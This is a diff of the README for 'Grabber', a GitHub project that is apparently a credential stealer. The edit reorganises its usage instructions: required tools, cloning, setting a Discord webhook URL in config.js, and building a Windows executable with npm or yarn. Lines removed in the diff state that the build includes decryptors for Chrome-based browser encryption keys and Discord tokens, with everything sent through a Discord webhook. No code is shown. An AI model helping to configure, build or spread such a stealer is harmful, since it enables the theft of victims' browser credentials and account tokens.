@@ -32,24 +32,40 @@ Everything is sent through a Discord Webhook.
 
 ## Using it
 
-First, you need to clone the repo and enter the repo directory:
+### Requirements
+
+To use and build this grabber, you'll need to download these things:
+
+* [Node.js](https://nodejs.org/en)
+* Visual Studio Build Tools
+* [Python](https://www.python.org/downloads/)
+* [nasm](https://www.nasm.us/)
+* Minimum knowledge in using JavaScript objects, booleans and strings
+
+### Getting the code
+
+You can:
+* [download zip](https://github.com/JustYuuto/Grabber/archive/refs/heads/master.zip)
+* or use git:
+  ```bash
+  git clone https://github.com/JustYuuto/Grabber.git
+  ```
+
+### Configuration
+
+Some things need to be configured (in the [`config.js`](config.js) file) before building the final exe, like the Webhook URL. If you don't know how to create a webhook, [you can learn it](https://support.discord.com/hc/en-us/articles/228383668). You can [click here](https://github.com/JustYuuto/Grabber/wiki/Configuration) for documentation about configuration items.
+
+### Building the executable
+
+After configuring the grabber, we can finally build it! Run the following command in the project folder:
 
 ```bash
-git clone https://github.com/JustYuuto/Grabber.git
-cd Grabber
-```
-
-Then you need to configure the [``config.js``](config.js) file, like setting a webhook URL, changing the app name...
-
-When you're done with the configuration, you can build the exe file! Use this command to build it:
-
-```bash
+npm run build
+# or with yarn
 yarn build
 ```
 
-This will build the Chrome-based browsers encryption key decryptor, the Discord token decryptor, build the icon to a ``.ico`` file, and then build the final exe.
-
-> The EXE build can be **very long** (about 20 minutes), so be very patient ^^
+As you don't have a compiled node.js with nexe, nexe will build what sounds like a "custom node.js". 
 
 ## Todo
 
